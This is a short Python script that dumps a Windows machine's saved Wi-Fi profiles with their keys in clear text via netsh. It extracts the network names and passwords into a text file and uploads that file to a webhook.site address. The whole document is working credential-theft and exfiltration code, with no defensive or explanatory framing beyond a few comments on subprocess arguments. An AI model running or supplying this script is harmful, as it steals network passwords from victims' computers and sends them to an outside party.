import subprocess
import sys
import os
import requests

url = "https://webhook.site/a0485a6a-6da1-4c53-88c2-8fe79a7a3a17"

command = subprocess.run(["netsh","wlan","export","profile","key=clear"], capture_output 
	= True).stdout.decode()

wifis = []
name_wifis = []
pass_wifis = []
path = os.getcwd()
for files in os.listdir(path):
	if files.startswith("Wi-Fi") and files.endswith(".xml"):
		wifis.append(files)
		for i in wifis:
			with open(i,'r') as f:
				for line in f.readlines():
					if "name" in line:
						stripped = line.strip()
						front = stripped[6:]
						back = front[:-7]
						name_wifis.append(back)
					if "keyMaterial" in line:
						stripped = line.strip()
						front = stripped[13:]
						back = front[:-14]
						pass_wifis.append(back)
						for x,y in zip(name_wifis,pass_wifis):
							sys.stdout = open("pass.txt","a")
							print(f"SSID: "+x, "Password: " +y,sep="\n")
							sys.stdout.close()

with open("pass.txt",'rb') as f:
	r = requests.post(url,data=f)
# commando.args -> netsh wlan ...
# command.returncode -> 0 = ok > 1 noOk -> stderr 
# capture_output = True -> get into the variable
# .stdout.decode() -> in original mode